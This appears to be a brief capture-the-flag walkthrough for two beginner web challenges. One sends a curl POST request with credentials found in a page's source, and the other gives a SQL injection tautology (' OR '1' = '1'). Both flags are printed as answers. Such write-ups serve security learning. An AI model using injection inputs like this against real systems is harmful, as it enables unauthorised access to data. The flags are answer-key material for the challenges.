# POST Pratice

If you go to the site and have it inspected, you will see a username and a password.

Execute `curl -X POST http://165.227.106.113/post.php -d "username=admin&password=71urlkufpsdnlkadsf"` on [Reqbin](https://reqbin.com/curl) to send a request and get the flag

<details>
<summary markdown="span">Answer</summary>

flag :``
flag{p0st_d4t4_4ll_d4y}
``
</details>

# Basic Injection

Paste the query in the input : `SELECT * FROM webfour.webfour where name = ' OR '1' = '1'`

<details>
<summary markdown="span">Answer</summary>

flag :``
CTFlearn{th4t_is_why_you_n33d_to_sanitiz3_inputs}
``
</details>